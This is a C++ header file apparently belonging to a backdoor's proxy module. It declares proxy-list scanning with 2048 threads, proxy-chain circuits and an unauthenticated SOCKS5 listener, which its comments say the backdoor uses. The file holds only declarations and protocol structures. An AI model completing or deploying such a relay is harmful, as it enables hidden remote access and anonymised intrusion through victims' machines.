#include <Windows.h>
#include <vector>

#include "../common/str.h"
#include "../api.h"

#pragma once

#ifdef _WIN64
#define WIN64
#endif
#ifdef WIN64
#pragma message ("Proxy.cpp: We are using 64-bit mode!")
#endif

// Debug output
#define DBG_
//#define DBG_VERBOSE

#define USE_SOCKS5
//#define USE_SOCKS4

#define SERVER_ONLY_MODE // no proxy chaining at all. acts like a simple SOCKS5 server - backdoor

#define SCAN_MODE								// 1 scan cycle
#define KNOWN_PROXY_LIST						"known_proxies.txt";

#define TIMING_TEST_PROXY						0 // Time before test_one_proxy begins work
#define TIMING_CREATE_SCAN_THREAD				0 // Time that get_active_list_thread takes to create threads

#define DEFAULT_HTTP_PORT						80
#define NUMBER_OF_SCANNING_THREADS				2048

#ifdef SERVER_ONLY_MODE
#define WAIT_FOR_SERVER_S						30 // Localhost, should be fast.
#define WAIT_FOR_SERVER_MS						0
#endif

class proxy_instance;

namespace proxy {
	typedef DWORD ER_PROXY;
	enum {
		ER_PROXY_OK,
		ER_PROXY_FAIL,
		ER_PROXY_TEST_CIRCUIT,
		ER_DESTINATION_CONNECT, // Failure to connect to the destination
	};

	// Timings
	static const UINT	timing_test_proxy		= TIMING_TEST_PROXY;
	static const UINT   timing_create_scan		= TIMING_CREATE_SCAN_THREAD;

	// Timings for server mode
#ifdef SERVER_ONLY_MODE

	// Amount of time till filter->local tor timeout
	static const UINT	timing_local_connect_s	= WAIT_FOR_SERVER_S;
	static const UINT	timing_local_connect_ms	= WAIT_FOR_SERVER_MS;

#endif

	// Engine state
	static bool			engine_state			= false;

	// WSAState
	static WSADATA		*wsadata				= NULL;
	static bool			wsa_state				= false;

	// Definitions
	typedef UINT		PR_INT32;
	typedef VOID		PR_THREAD_ENTRY;
	typedef SOCKET		*PSOCKET;

	// Use this structure to pass information to the proxy
	typedef str_string*	PROXY_ADDRESS;
	typedef WORD		PROXY_PORT; // In network order
	typedef struct {
		PROXY_ADDRESS	ip_address;
		PROXY_PORT		port;
	} PROXY_INFO, *PPROXY_INFO;
	typedef str_string* DEST_ADDRESS;
	typedef WORD		DEST_PORT;
	typedef str_string*	DEST_DOMAIN; 
	typedef struct {
		DEST_DOMAIN		domain;
		DEST_ADDRESS	ip_address;
		DEST_PORT		port;
	} DEST_INFO, *PDEST_INFO;

	// Pointer to buffer of structure ip:port\nip:port\n ,etc - Entry point
	typedef struct {
		LPVOID			buffer;
		UINT			size;

		//LPVOID			known_buffer; // Handled internally
		//UINT			known_size;

		LPSTR			known_target;

		UINT			number_of_chains;
	} PROXY_LIST, *PPROXY_LIST;

	// Previously stored proxies. Passed to functional_servers Ctor
	typedef struct {
		LPSTR			target_file;
		LPVOID			buffer;
		UINT			size;
	} WORKING_PROXIES, *PWORKING_PROXIES;
	static PWORKING_PROXIES working_proxies_list;

	// Active proxy chain
	static std::vector<std::vector<proxy_instance *>> chain_array;

	// Destination 
	typedef DWORD ER_DEST_PARSE;
	enum {
		ER_DEST_PARSE_OK,
		ER_DEST_PARSE_FAIL
	};
	typedef struct {
		LPSTR		domain;
		LPSTR		ip_address;
		UINT		port;
	} TARGET_SERVER, *PTARGET_SERVER;
	//proxy::ER_DEST_PARSE parse_destination(__inout PDEST_INFO dest_info, 
	//	__in const PTARGET_SERVER target);
	static PTARGET_SERVER destination_target = NULL; // Target domain or IP address
	SOCKET __declspec(dllexport) build_chain(__in const PPROXY_LIST list, 
		__in const PTARGET_SERVER target, 	__in const SOCKET server_socket);
	VOID close_chain(const SOCKET socket);
	typedef struct {
		str_string		*buffer;
		PROXY_ADDRESS	ip_address;
		PROXY_PORT		port;
	} PROXY_ENTRY, *PPROXY_ENTRY;

	// Binds a SOCKS5 listener, dispatches to build_chain
	typedef DWORD SERVER_ERROR;
	enum {
		SERVER_ERROR_OK,
		SERVER_ERROR_GENERAL_FAILURE,
		SERVER_ERROR_SOCKET_INIT,
		SERVER_ERROR_SOCKOPT,
		SERVER_ERROR_BIND
	};
	class socks_server;
	static class socks_server *socks5_listener;
	SERVER_ERROR __declspec(dllexport) start_socks5_listener(PPROXY_LIST list, WORD port);

	// External mode - used by the backdoor
	socks_server *start_socks5_listener_return_object(WORD port);

	// Constructs the actual circuit, returns the final working SOCKET
	SOCKET initialize_circuit(std::vector<proxy_instance *>& proxies,
		const SOCKET server_socket);

	// Destroy the proxy chain, creates a new chain.
	VOID destroy_chain(std::vector<proxy_instance *>& proxies);

	// Tests the chain. Generally occurrs after failure. Removes failed nodes from working 
	// proxies and cleans up working servers list.
	proxy::ER_PROXY test_circuit_and_fix(std::vector<proxy_instance *>& chain);

	// Removes a failed server from working_servers. Cleans up the working servers
	// file on disk.
	proxy::ER_PROXY remove_broken_proxy_from_working_servers(
		proxy_instance *instance, std::vector<proxy_instance *>& chain);

	// Is the proxy an element of an active circuit?
	bool is_server_in_circuit(const proxy_instance *instance, 
		const std::vector<std::vector<proxy_instance *>> circuits);

	// SOCKET binding. Callback for error handling.
	typedef VOID PROXY_CALLBACK;
	proxy::PROXY_CALLBACK bound_error_callback(__in const PSOCKET listener, 
		__in const PSOCKET chain);

	// Adds a proxy chain
	//ER_PROXY add_to_chain(__in proxy::PPROXY_INFO info, __out SOCKET *out_socket);

	// Returns a random proxy; does not test it. get_active_list tests the proxy
	proxy::PPROXY_ENTRY get_random_proxy(std::vector<proxy::PPROXY_ENTRY> entries);

	// Syncs up close_chain, initialize_circuit and test_circuit_and_fix
	static CRITICAL_SECTION *sync_chain_mod;

	// Class for the functioning servers
	static UINT functional_server_counter			= 0;
	class functional_servers;
	static class functional_servers *working_servers;

	// Return the current proxy to test (in the list) 
	static PR_INT32 current_entry					= 0;
	proxy::PR_INT32 get_current_test_proxy(__in std::vector<PPROXY_ENTRY> entries);
	
	// select Timeouts
	static const UINT timeout_s_					= 30;
	static const UINT timeout_ms_					= 0;

	// Port constants
	static const UINT port_http						= DEFAULT_HTTP_PORT;

	// proxy testing /////////////////////////////////////////////////////////////
	static const PCHAR test_http_header				= "GET / HTTP/1.1\r\nHost: ";
	static const PCHAR test_header_end				= "\r\n\r\n";

	// cmyip.com
	static const PCHAR test_cmyip_host				= "198.100.149.221";
	static const UINT test_cmyip_port				= 80;
	static const PCHAR test_cmyip_look_for			= "HTTP/1.1 200 OK";

	// Local HTTPd
	static const PCHAR test_local_host				= "127.0.0.1";
	static const UINT test_local_port				= 80;
	static const PCHAR test_local_look_for			= "HTTP/1.1 200 OK";

	// Main test definition
	static const PCHAR test_host					= test_cmyip_host;
	static const UINT test_port						= test_cmyip_port;
	static const PCHAR test_look_for				= test_cmyip_look_for;

	// SOCKS4 protocol //////////////////////////////////////////////////////////
	static const BYTE socks4_version				= 0x04;
	static const BYTE socks4_command_code_stream	= 0x01;
	static const BYTE socks4_command_code_bind		= 0x02;
	struct socks4_request {
		BYTE	version;
		BYTE	command_code;
		WORD	port;
		DWORD	ip;
	};

	static const BYTE socks4_response_null			= 0x00;
	static const BYTE socks4_request_granted		= 0x5a;
	static const BYTE socks4_request_rejected		= 0x5b;
	struct socks4_response {
		BYTE	null;
		BYTE	status;
		WORD	arbitrary1;
		DWORD	arbitrary2;
	};


	// SOCKS5 protocol ///////////////////////////////////////////////////////////
	// Initial greeting from client -> server
	static const BYTE socks5_version				= 0x05;		// indicates socks5 type
	static const BYTE socks5_num_of_auth_methods	= 0x01;		// 1 type of method
	static const BYTE socks5_auth_method			= 0x00;		// No authentication
	static const BYTE socks5_greeting[	sizeof(socks5_version) +
										sizeof(socks5_num_of_auth_methods) +
										sizeof(socks5_auth_method)] = {
		socks5_version,
		socks5_num_of_auth_methods,
		socks5_auth_method
	};
	// Initial greeting response server -> client
	struct socks5_greeting_response {
		BYTE version;
		BYTE auth_method;
	};

	struct socks5_connect_generic_response {
		BYTE	version;
		BYTE	status;
		BYTE	reserved;
		BYTE	type;
		DWORD	address;
		BYTE	port[2];
	};

	// Client connection request
	typedef DWORD dest_ip;
	static const BYTE socks5_command_code			= 0x01;		// TCP/IP stream connection
	static const BYTE socks5_reserved				= 0x00;
	static const BYTE socks5_address_type_ip		= 0x01;		// Indicates IPv4 address
	static const BYTE socks5_address_type_dom		= 0x03;		// Domain
	struct socks5_client_connection_request {
		BYTE	version;										// socks5_version
		BYTE	command_code;									// TCP/IP stream connection
		BYTE	reserved;										// Always 0x00
		BYTE	address_type;								// socks5_address_type_ip/socks5_address_type_dom
		dest_ip	ip;
		WORD	port;
		/*
		union {
				dest_ip		destination_ip;
				struct domain {
					BYTE	domain_length;
					CHAR	domain_name[];
				};
		};*/
	};
	struct socks5_client_connection_request_domain {
		BYTE	version;
		BYTE	command_code;
		BYTE	reserved;
		BYTE	address_type;
		BYTE	name_length;
	};
	static const BYTE socks5_status_ok				= 0x00;
	struct socks5_client_connection_response {
		BYTE	version;
		BYTE	status;
		BYTE	reserved;
		BYTE	address_type;
		dest_ip	ip;
		WORD	port;
	};
	struct socks5_client_connection_response_domain {
		BYTE	version;
		BYTE	status;
		BYTE	reserved;
		BYTE	address_type;
		BYTE	address_size;
	};
	

	// Known proxies file
	static const LPSTR known_file_list				= KNOWN_PROXY_LIST;

#ifdef SERVER_ONLY_MODE
	SOCKET connect_to_socks5_server(__in const LPSTR server_address, __in const WORD server_port,
		__in const LPSTR dest_address, __in const WORD dest_port);
#endif
};

